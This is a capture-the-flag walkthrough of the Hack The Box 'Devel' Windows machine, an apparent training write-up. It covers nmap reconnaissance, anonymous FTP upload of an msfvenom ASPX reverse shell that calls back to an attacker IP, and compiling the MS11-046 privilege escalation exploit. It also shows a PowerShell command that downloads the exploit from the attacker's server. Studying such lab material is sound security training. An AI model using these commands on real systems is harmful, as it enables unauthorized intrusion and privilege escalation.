---
title: Devel
date: 2022-06-11 15:08:03
author: 0xma
img: /medias/images/devel/Devel.png
categories: 
  - windows
  - hackthebox
tags:
  - ctf
  - htb-devel
  - hackthebox
  - webshell
  - aspx
  - meterpreter
  - metasploit
  - msfvenom
  - ms11-046
  - ftp
  - nishang
  - nmap
  - watson
  - smbserver
  - upload
  - windows
  - oscp-like
---
# [Easy] Devel

![Untitled](/medias/images/devel/Devel.png)

## Reconnaissance

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```bash
sudo nmap -sC -sV -O -oA nmap/initial <IP>
```

- **sC**: run default nmap scripts
- **sV**: detect service version
- **O**: detect OS
- **oA**: output all formats and store in file *nmap/initial*

We get back the following result showing that port 80 is open with Microsoft IIS web server running on it and port 21 is open with FTP running on it.

![Untitled](/medias/images/devel/Untitled%201.png)

Before we start investigating the open ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```bash
sudo nmap -sC -sV -O -p- -oA nmap/full <IP>
```

We get back the same results as above.

Similarly, we run an nmap scan with the **sU** flag enabled to run a UDP scan.

```bash
sudo nmap -sU -O -oA nmap/udp <IP>
```

We get back the following result. As can be seen, the top 1000 ports are closed.

Our only avenue of attack is port 80 & port 21. The nmap scan did show that FTP allowed anonymous logins and so we’ll start there.

## Enumeration

Anonymous File Transfer Protocol (FTP) allow anyone to log into the FTP server with the username “anonymous” and any password to access the files on the server.

![Untitled](/medias/images/devel/Untitled%202.png)

Try navigating to these files in the browser.

![Untitled](/medias/images/devel/Untitled%203.png)

The FTP server seems to be in the same root as the HTTP server. Why is that interesting? Well, if I upload a reverse shell in the FTP server, I might be able to run it through the web server.

```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=<YourIP> LPORT=4242 > revshell.aspx
```

Our nmap scan showed that the web server is Microsoft IIS version 7.5. IIS web server generally either executes ASP or ASPX (ASP.NET). Since the version is 7.5, further googling tells us that it likely supports ASPX.

Upload the file on the ftp server.

![Untitled](/medias/images/devel/Untitled%204.png)

Go back to your listener to see if the shell connected back.

![Untitled](/medias/images/devel/Untitled%205.png)

Perfect! We have a shell and it’s running as **iis apppool\web**.

Change the directory to the **Users** directory where the flags are stored.

Try to access the **babis** and **Administrator** user directories.

![Untitled](/medias/images/devel/Untitled%206.png)

We don’t have permission, so let’s learn more about the operating system to see if we can escalate privileges.

![Untitled](/medias/images/devel/Untitled%207.png)

We’re on a Microsoft Windows 7 build 7600 system. It’s fairly old and does not seem to have been updated, so it’s probably vulnerable to a bunch of exploits.

## Privilege Escalation

Let’s use google to look for [exploits](https://www.exploit-db.com/exploits/40564).

![Untitled](/medias/images/devel/Untitled%208.png)

The first two exploits displayed allow us to escalate privileges. The second exploit (MS11–046), has documentation on how to compile the source code, so we’ll go with that one.

Get the **EDB-ID** from the web page, so that we can use it to find the exploit in **searchsploit**.

![Untitled](/medias/images/devel/Untitled%209.png)

Update **searchsploit** to ensure you have all the latest vulnerabilities.

```bash
searchsploit -u
```

Use the **m** flag to look for the exploit **40564** and copy it to the current directory.

```bash
searchsploit -m 40564
```

![Untitled](/medias/images/devel/Untitled%2010.png)

Now, we need to compile the exploit. The compilation instructions are in the [exploitdb webpage](https://www.exploit-db.com/exploits/40564).

If you don’t have mingw-w64 installed, install it.

```bash
sudo apt-get update && sudo apt-get install mingw-w64
```

Compile it using the listed command.

```bash
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

Alright, we have a compiled exploit. Now what is left is to transfer the exploit to the target (Devel) machine.

Start up a server on the attack (Kali) machine.

```bash
python2 -m SimpleHTTPServer 80
```

Netcat doesn’t seem to be installed on Windows, but powershell is. So, we’ll use it to transfer the file from our server to a directory we can write to.

```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<YourIP>/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

![Untitled](/medias/images/devel/Untitled%2011.png)

![Untitled](/medias/images/devel/Untitled%2012.png)

![Untitled](/medias/images/devel/Untitled%2013.png)